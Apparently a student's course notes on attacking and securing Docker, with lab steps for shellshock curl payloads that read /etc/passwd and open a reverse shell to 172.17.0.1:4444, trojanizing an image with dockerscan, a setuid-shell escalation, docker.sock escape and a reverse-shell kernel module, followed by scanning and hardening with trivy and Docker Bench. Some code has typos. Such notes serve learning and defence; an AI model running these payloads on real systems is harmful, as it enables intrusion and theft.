# Hacking and Securing Docker Containers v2.0


Some of the notes that is specially outside from the [general notes](../Notes.md). 

Things that we will be looking at are:
- Introduction to Docker
- Docker fundamentals
- Attacks against docker environments
- Automated Assessments
- Defenses

---

## Hacking Docker Containers
### Docker Attack Surface
- External attackers using API
- Malicious insiders
- Compromised container (modified image)

### Exploting vulnerable images
This image has the vulnerability of a shellshock, affected many services (http, smtp, ssh)
[Image link](https://hub.docker.com/r/vulnerables/cve-2014-6271)
```bash
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271
```

Curl the command line to get the list of the password
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
```

Curl the command line below to do a interative accessing the container
```bash
# Terminal 1
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 @>&l'" http://localhost:8080/cgi-bin/vulnerable

# Terminal 2: You can access data in the docker container
nc -nlvp 4444

```
Why 172.17.0.1? Use `ipconfig docker0` to get the ip address from the inet

### Backdooring docker images
```bash
git clone https://github.com/cr0hn/dockerscan.git
sudo python3.8 setup.py install

# Verify dockerscan is installed
dockerscan

# Change directory to backdoor and remove everything
cd ..
cd backdoor
rm -rf *

# Pull the latest ubuntu image and save it as a new tar image
docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original

# Setting some environment variable
export LC_ALL=C.UTF-8
export LANG=C.UTF-8

# Finding the ip address to be used for backdooring
ipconfig docker0
### inet 172.17.0.1 <---- this ip address is the one we will be using

# Modifying the image
dockerscan image modify trojanize ubuntu-original -l 172.17.0.1 -p 4444 -o ubuntu-original-trojanized

# Terminal 1: To receive the reversed shell, and use the interative
nc -v -k -l 172.17.0.1 4444

# When someone pull your image
docker load -i ubuntu-original-trojanized.tar
docker run -it ubuntu:latest bash

# You can access it from Terminal 1
```

### Privilege Escalation
Getting the root access to the host machine as a non-root user

Four files are required
- Dockerfile
```yaml
FROM alpine:latest
COPY shellscript.sh shellscript.sh
COPY shell shell
```
- shell.c
```c
int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}
```
- shellscript.sh
```
#!/bin/bash
cp shell /shared/shell
chmod 4777 /shared/shell
```

Then we build the image
```sh
docker build --rm -t privesc .
```
- `shell` binary file under /usr/bin/shell

Then we can run the docker command
`docker run -v /tmp/:/shared/ privesc:latest /bin/sh shellscript.sh`
-v : setting the volume to link the /tmp on the local host to the shared folder in the container
privesc: Name of the image
/bin/sh shellscript.sh: Entrypoint for the docker run

Navigate to the tmp directory and run the shell, voila you get to acess all the files on the root access
```sh
cd /tmp
./shell
# id
# cat /etc/shadow
```

### Container Breakout techniques
Existing exploits
1. Over privileged containers - CAP_SYS_ADMIN, CAP_SYS_MODULE
2. Dangerous mountpoints - /var/run/docker.sock

### Docker socket (docker.sock)
- Docker socket is a UNIX socket, which is a backbone for managing containers.
- When we type Docker commands using docker cli client, it interacts with Docker daemon using the UNIX socket.
- This socket can be exposed over the network on a specific port - HTTP API.
- UNIX socket is the default setting.
- Mounting /var/run/docker.sock into the container is dangerous.

### Container escape using docker.sock
Getting a shell to start attac
`dockr run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh`

Install docker client
```
apk udpdate
apk add -U docker

```sh
Running another container in within the container and mount the root
```sh
docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
```
-H unix:///var/run/docker.sock: Specifying that this is the docker socket that docker can use
ro: readonly

Now we are inside the new container and we can access the root folder of the host
```sh
cd /test/root
```

### --privileged flag
- When --privileged flag is used with a container, it will give all Linux capabilities to the container.
- If an attacker gains access to the container he can take advantage of these capabilities.
- **cap_sys_admin**, **cap_sys_ptrace** and **cap_sys_module** are some of the dangerous capabilities to be exploited by attacked.
- When an attacker gains a shell on the container and if it has cap_sys_module enabled, it is possible to load a kernel module directly onto the host’s kernel from within the container.

```sh
# Using the privilege flag
docker run -it --privileged alpine sh

# Install
apk add -U libcap

# Get the list of the privilege capabilities
capsh --print
# CAP_SYS_MODULE, CAP_SYS_ADMIN, ...

```

### Writing to kernel space from a container
When the docker container is ran with privilege flag, it has the `CAP_SYS_MODULE` for us to load some kernel module (a binary file with `.ko` extension - stands for kernel object, a file compiled with C programming compiler)

`.ko` file is loaded with the command `insmod` or `modprobe`

#### How to compile one `.ko` file? (ChatGPT 🤖)
In Linux, a `.ko` file is a kernel object file. It contains a compiled kernel module that can be loaded into the kernel using tools like `insmod` or `modprobe`.

To build a kernel module and generate a `.ko` file, you typically need the kernel headers and development tools installed on your system. Here's a general overview of the steps involved in building a kernel module:

1. Install Kernel Headers: Ensure that the appropriate kernel headers are installed on your system. These headers provide the necessary interface and definitions for building kernel modules.

2. Create the Module Source Code: Write the source code for your kernel module. This can be done using a text editor. Kernel modules are typically written in C or a compatible language.

3. Write a Makefile: Create a Makefile that specifies the compilation instructions for building the module. The Makefile should specify the necessary compiler flags and dependencies.

4. Build the Module: Use the `make` command to build the module. The Makefile will compile the source code and generate the corresponding `.ko` file.

5. Load the Module: Once the module is built, you can load it into the kernel using the `insmod` command. Make sure you have appropriate permissions (root or superuser) to load the module.

#### Steps by steps (ChatGPT 🤖)
To code a kernel module, you'll need a good understanding of C programming, Linux kernel internals, and the specific functionality you want to implement. Here's a high-level overview of the steps involved in coding a basic kernel module:

1. Set up Development Environment:
   - Install the necessary development tools and kernel headers for your Linux distribution.
   - Set up a suitable development environment, such as a text editor or an integrated development environment (IDE).

2. Create a New Source File:
   - Start by creating a new C source file for your kernel module. Give it a `.c` extension (e.g., `module.c`).

3. Include Required Headers:
   - Include the necessary headers, such as `<linux/module.h>` and `<linux/kernel.h>`, which provide essential definitions and functions for kernel modules.

4. Implement Module Initialization and Cleanup Functions:
   - Define an initialization function (`module_init`) and a cleanup function (`module_exit`) that will be called when the module is loaded and unloaded, respectively.

5. Implement Desired Functionality:
   - Write the code for your module, implementing the desired functionality. This can involve interacting with kernel APIs, device drivers, or other kernel components.

6. Build the Module:
   - Create a Makefile to specify the compilation instructions for your module.
   - Use the Makefile and the `make` command to compile your module into a `.ko` file.

7. Load and Test the Module:
   - Use the `insmod` command to load your module into the kernel.
   - Test your module by invoking its functionality and observing the expected behavior.

8. Unload the Module:
   - When you're done testing, use the `rmmod` command to unload the module from the kernel.

##### Example for loading and unloading the module: 
1. `docker_module.c` file
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init docker_module_init(void) {
    printk(KERN_INFO "Docker module has been loaded\n") ;
    return 0;
}

static void __exit docker_module_exit(void) {
    printk(KERN_INFO "Docker module has been unloaded\n") ;
}

module_init(docker_module_init);
module_exit(docker_module_exit);

```

2. A makefile to compile the module: `Makefile`
```MAKEFILE
obj-m += docker_module.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
```

3. Compile it and you will see a .ko file is generated
```make```

4. Install the mod in the docker container which is ran as --privileged
```insmod docker_module.ko```

You can check the list of the module installed
```lsmod```

You can check the log of the kernel too
```tail -f /var/log/kern.log```

5. Uninstall the mod
```rmmod docker_module.ko```

### Writing to kernel space to get a reverse shell
1. `reverseshell_module.c`'s content
(Commented by ChatGPT 🤖)
```c
#include <linux/kmod.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

// This line declares a static character array named command with a size of 50. It represents the command to be executed to establish the reverse shell connection. In this example, it runs a Bash command that redirects the input/output to a specified IP address and port.
static char command[50] = "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1";

// These lines declare two arrays. argv is an array of strings that represents the arguments to be passed to the call_usermodehelper function. It contains the path to the Bash executable (/bin/bash), the -c flag to specify a command to run, and the command string containing the reverse shell connection command.
char* argv[] = {"/bin/bash", "-c", command, NULL};

// envp is an array of strings that represents the environment variables to be set when executing the user mode helper. In this case, it sets the HOME variable to /.
static char* envp[] = {"HOME=/", NULL};

// This function is the module's initialization function, marked with __init. It is called when the module is loaded. The function uses the call_usermodehelper function to execute the specified command in user mode. It passes the argv and envp arrays as arguments and specifies UMH_WAIT_EXEC to wait for the command to complete execution.
static int __init connect_back_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

// This function is the module's exit function, marked with __exit. It is called when the module is unloaded. In this case, it simply prints a message to the kernel log using the printk function.
static void __exit connect_back_exit(void){
    printk(KERN_INFO "Exiting\n");
}

// These lines register the initialization and exit functions as the module's entry points using the module_init and module_exit macros, respectively.
module_init(connect_back init);
module_exit(connect_back_exit);

```

Using the same makefile to compile the code
Attacker's terminal:
```sh
nc -nlvp 4444
```

Docker container:
chmod +x reverseshell_module.ko
insmod reverseshell_module.ko

Doubt: I don't understand why the author hacked its own host by adding some files into it themselves, maybe I am missing something there.

### Accessing Docker secrets
Secrets are usually kept in places such as environment variables or within the source code.
Anyone with access to the container, can easily read these secrets.
A user with privileged access on the host, can also access secrets residing inside the container - docker inspect away.

#### Methods of getting the environemnt variable
```bash
# Method 1
docker run --rm -it database sh
env

# Method 2
docker inspect <image-container>

# Method 3
docker inspect <image-container> -f "{{json .Config.Env}}"

```

## Automated Assessment
https://github.com/aquasecurity/trivy is a simple vulnerability scanner for containers.

This tools also fits well in CI/CD pipelines, so it can also be used in DevSecOps pipelines.
We use trivy to perform a static analysis against Docker Images.
We are going to use the image tagged as getcapsule8/shellshock:test on docker hub as our target.

### Scanning Docker Image
```sh
git clone https://github.com/aquasecurity/trivy
cd trivy
docker run --rm -bv `pwd`:/root/.cache aquasec/trivy getcapsule8/shellshock:test

# pwd : print working directory (current directory that you are on)
# /root/.cache : A directory in the docker container
# /aquasec/tricy : Image name of the docker scanner
# getcapsule8/shellshock:test : Target of the image that we are scanning

```

#### Scanned Output
getcapsule8/shellshock:test (ubuntu 12.10)
==========================================
Total: 145 (UNKNOWN: 0, LOW:33, MEDIUM: 106, HIGH: 6, CRITICAL: 0)

| LIBRARY     | VULNERABILITY ID | SEVERITY | INSTALLED VERSION | FIXED VERSION     | TITLE                                                                         |
| ----------- | ---------------- | -------- | ----------------- | ----------------- | ----------------------------------------------------------------------------- |
| ...         | ...              | ...      | ...               | ...               | ...                                                                           |
| libssl1.0.0 | CVE-2014-0160    | HIGH     | 1.0.1c-3ubuntu2   | 1.0.1c-3ubuntu2.7 | openssl: information disclosure in handling of TLS hearbeat extension packets |

### Auditing the environment using Docker Bench Security
[Docker bencn security](https://github.com/docker/docker-bench-security)

Docker bench security is a script that checks for dozens of common best-practices around deploying Docker containers in production.
It uses CIS benchmarks.

Terminal 1
```sh
docker run -itd --name vulnerable alpine

```

Terminal 2
```sh
docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /usr/bin/containerd:/usr/bin/containerd:ro \
    -v /usr/bin/runc:/usr/bin/runc:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    --label docker_bench_security \
    docker-bench-security

# docker/docker-bench-security:latest will be downloaded
```

#### Example Output
```sh
[NOTE] 5.22 - Ensure docker exec commands are not used with privileged option
[NOTE] 5.23 - Ensure docker exec commands are not used with user option
[PASS] 5.24 - Ensure cgroup usage is confirmed
[WARN] 5.25 - Ensure the container is restricted from acquiring additional privileges
[WARN]        * Privileges not restricted: vulnerable
[WARN] 5.26 - Ensure container health is checked at runtime
[WARN]        * Health check not set: vulnerable
[INFO] 5.27 - Ensure docker commands always get the latest version of the image
[WARN] 5.28 - Ensure PIDs cgroup limit is used
[WARN]      * PIDs limit not set: vulnerable
[INFO] 5.29 - Ensure Dockers default bridge docker® is not used
[INFO]      * Container in docker® network: vulnerable
[PASS] 5.30 - Ensure the hosts user namespaces is not shared
[PASS] 5.31 - Ensure the Docker socket is not mounted inside any containers

...

[INFO] Checks: 105
[INFO] Score: 17
```
The 5.22, 5.23, ... are the numbering list for the checking

#### Important Warnings
```sh
[WARN] 5.10 - Ensure memory usage for container is limited
[WARN]        * Container running without memory restrcitions: vulnerable
[WARN] 5.11 - Ensure CPU priority is set appropriately on the container
[WARN]        * Container runnong without CPU restrictions: vulnerable
...
[WARN] 5.28 - Ensure PIDs cgroup limit is used
[WARN]      * PIDs limit not set: vulnerable
```
Hence, we will need to limit the cpu and memory usage along with setting the max max limit of pids

#### Fixing Error
Let's fix one of the problem about creating a user
```
[WARN] 4.1 - Ensure a user for the container has been created
[WARN]       * RUnning as root: vulnerable
```

Back to Terminal 1:
```sh
# Stop and remove all the container first
docker stop $(docker ps -aq)
docker rm $(docker ps -aq)
docker run -itd --user 1000:1000 --name vulnerable alpine

```

Back to Terminal 2:
Do the scan again
```sh
docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /usr/bin/containerd:/usr/bin/containerd:ro \
    -v /usr/bin/runc:/usr/bin/runc:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    --label docker_bench_security \
    docker-bench-security


# [PASS] 4.1 - Ensure a user for the container has been created
# ...
# [INFO] Checks: 105
# [INFO] Score: 19 

```
The score increased from 17 to 19 after we set to run the docker as user and not root

If the user flag `--user 1000:1000` is not specified, the user in the container is root and you can get cat anything you want
```sh
docker run -it --rm --name vulnerable2 alpine
id 
# uid=0(root) gid=0(root) groups=0(root),...
cat /etc/shadow
# root:!::0:::::
# bin:!::0:::::
# ...

```

As for the image that we set `--user` flag for it
```sh
docker exec -it vulnerable sh
id 
# uid=1000 gid=1000
cat /etc/shadow
# cat: can't open '/etc/shadow': Permission denied
```